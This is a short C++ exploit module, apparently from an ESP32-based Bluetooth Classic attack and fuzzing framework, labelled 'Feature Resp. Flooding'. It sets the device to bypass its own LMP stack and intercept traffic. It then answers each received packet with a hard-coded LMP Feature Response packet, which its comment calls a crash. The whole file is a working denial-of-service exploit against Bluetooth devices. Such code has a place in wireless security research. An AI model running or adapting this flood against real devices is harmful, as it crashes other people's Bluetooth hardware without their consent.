#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Feature Resp. Flooding";
}

static uint pkt_number = 0;

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = true; // Bypass ESP32 LMP stack, forward TX/RX to host
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    pkt_number = 0;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

// Feature Response Flooding Crash
uint8_t packet[] = {0x99, 0x03, 0x4f, 0x00,                                // Baseband + ACL Header
                    0x50, 0xbf, 0xee, 0xcd, 0xfe, 0xdb, 0xff, 0x7b, 0x87}; // LMP Feature Response

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    module_request_t *m = (module_request_t *)p;
    m->tx_count = 1;
    m->pkt_buf = packet;
    m->pkt_len = sizeof(packet);
    char text[32];
    snprintf(text, sizeof(text), "Sent Res. n. %d\n", ++pkt_number);
    wd_log_y(text);
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}